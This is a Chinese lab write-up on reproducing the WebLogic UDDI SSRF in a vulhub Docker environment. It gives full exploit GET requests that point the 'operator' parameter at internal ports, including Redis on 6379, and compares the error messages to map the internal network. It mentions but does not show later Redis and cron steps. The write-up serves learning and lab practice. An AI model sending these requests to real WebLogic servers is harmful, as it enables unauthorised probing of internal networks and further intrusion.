ailx10说：这篇是我2024年9月写的。这次再看 WebLogic SSRF，我把注意力放到了返回差异上：有的像 HTTP 页面，有的连接失败，有的不是预期的 SOAP 响应。先从这些线索探内网，再试着与 Redis 交互，才走到后面的定时任务和连接。写下来的时候我也觉得，这种把几个功能拼起来的思路挺巧。可回头整理，不能让“巧”遮住条件：网络可达、服务认证、写权限和任务格式都得成立，每个返回也只能支持相应的一小段判断。

---

本文记录历史 SSRF 实验中不同内部端口返回以及后续 Redis 操作的观察。

原文命令数量与列举不一致；跨协议访问、持久化写入、cron 与重定向都依赖具体环境，未重新验证。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Weblogic SSRF漏洞 环境搭建成功了

![](/notes-assets/2b3ab27373e63e6f4bc5.webp)

（1）访问存在的HTTP端口，`http://127.0.0.1:7001`

```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001 HTTP/1.1
```

返回内容：`An error has occurred`

`weblogic.uddi.client.structures.exception.XML_SoapException:`

`The server at http://127.0.0.1:7001 returned a 404 error code (Not Found).`

`Please ensure that your URL is correct,`

`and the web service has deployed without error.`

![](/notes-assets/3295b7e46f89b3d29812.webp)

（2）访问不存在的HTTP端口，`http://127.0.0.1:7002`

```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7002 HTTP/1.1
```

返回内容：

`An error has occurred`

`weblogic.uddi.client.structures.exception.XML_SoapException:`

`Tried all: '1' addresses,`

`but could not connect over HTTP to server: '127.0.0.1', port: '7002'`

![](/notes-assets/2149b56e45fecc954d9f.webp)

（3）访问存在的非HTTP协议端口，这里6379是redis端口

```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://172.18.0.2:6379 HTTP/1.1
```

返回内容：

`An error has occurred`

`weblogic.uddi.client.structures.exception.XML_SoapException:`

`Received a response from url: http://172.18.0.2:6379`

`which did not have a valid SOAP content-type: null.`

![](/notes-assets/ce500dd8ebd1f17dc222.webp)
